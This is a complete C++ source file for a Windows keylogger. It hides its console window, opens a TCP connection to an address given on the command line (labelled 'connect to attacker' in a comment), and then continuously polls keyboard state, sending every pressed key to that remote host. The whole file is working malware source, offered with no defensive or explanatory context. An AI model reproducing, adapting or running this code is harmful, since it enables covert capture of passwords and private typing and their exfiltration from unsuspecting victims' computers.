#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "Ws2_32.lib")

#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

using namespace std;

int keyLog(SOCKET Socket)
{
    int KEY;
    while (true)
    {
        Sleep(50);
        for (KEY = 0x8; KEY < 0xFF; KEY++)
        {
            if (GetAsyncKeyState(KEY) & 0x8000)
            {
                char buffer[2];
                buffer[0] = KEY;
                send(Socket, buffer, sizeof(buffer), 0);
            }
        }
    }
}

int main(int argc, char *args[])
{
    // hide window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // server variables
    char *ip;
    int port;

    if (argc > 1)
    {
        // take from args
        ip = args[1];
        port = atoi(args[2]);
    }
    else
    {
        // hard code server variables
        ip = "0";
        port = 0;
    }

    // winsock init
    WSADATA wsaData;
    SOCKADDR_IN addr;
    WORD DLLversion = MAKEWORD(2, 1);
    if (WSAStartup(DLLversion, &wsaData) != 0)
    {
        perror("Erorr, can't initiate winsock");
        ExitProcess(EXIT_FAILURE);
    }

    // create Socket
    SOCKET Socket = socket(AF_INET, SOCK_STREAM, 0);
    if (Socket < 0)
    {
        perror("Erorr, can't create socket");
        ExitProcess(EXIT_FAILURE);
    }

    // bind the socket
    addr.sin_addr.s_addr = inet_addr(ip);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    // connect to attacker
    connect(Socket, (SOCKADDR *)&addr, sizeof(addr));

    // start sending
    keyLog(Socket);

    // close the connection
    closesocket(Socket);
    WSACleanup();
    ExitProcess(EXIT_SUCCESS);
}
